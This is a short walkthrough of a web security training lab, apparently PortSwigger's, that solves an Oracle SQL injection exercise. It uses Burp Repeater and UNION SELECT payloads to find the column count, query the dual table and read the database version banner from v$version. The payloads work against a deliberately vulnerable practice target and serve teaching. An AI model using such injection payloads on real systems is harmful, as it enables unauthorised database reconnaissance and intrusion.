# SQL injection attack, querying the database type and version on Oracle

### Lab description
This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query. 

**Goal:** display the database version string. 

---

## Steps
Make sure Burp Proxy is active and interception is ON, select category and forward this request to Repeater for for further modify and reuse.

Try determine columns number and which columns contains text by entering following queries: 
```SQL
' UNION SELECT NULL, NULL-- 500 Internal Server Error
```

when entering query use CTRL + U for URL-encode.

On Oracle databases, every SELECT statement must specify a table to select FROM, this table calls **dual**. Let's try 

```SQL
' UNION SELECT NULL, NULL FROM dual-- 200 OK
```

For determine DB version need to use banner from v$version table:
```SQL
'+UNION+SELECT+banner,+NULL+FROM+v$version-- 200 OK
```

>**Congratulations, you solved the lab!**